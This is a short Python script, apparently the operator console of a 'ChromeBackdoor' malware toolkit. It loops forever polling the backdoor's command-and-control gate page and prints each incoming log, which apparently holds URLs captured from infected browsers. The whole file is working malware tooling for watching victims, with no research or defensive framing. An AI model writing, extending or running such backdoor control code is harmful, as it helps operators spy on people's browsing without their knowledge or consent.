#!usr/bin/env python

# Graniet - ChromeBackdoor scrapper

import urllib2
import time

class bcolors:
    
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

GATE = "http://localhost:8888/chromebackdoor/web/gate.php?last=1"
while 1:
    html = urllib2.urlopen(GATE).read()
    if "Url" in html:
        print(bcolors.OKBLUE+"[X]"+bcolors.ENDC+" LOG RECEIVE :")
        print(bcolors.OKBLUE+"-------"+bcolors.ENDC)
        print(html)
        print(bcolors.OKBLUE+"-------"+bcolors.ENDC)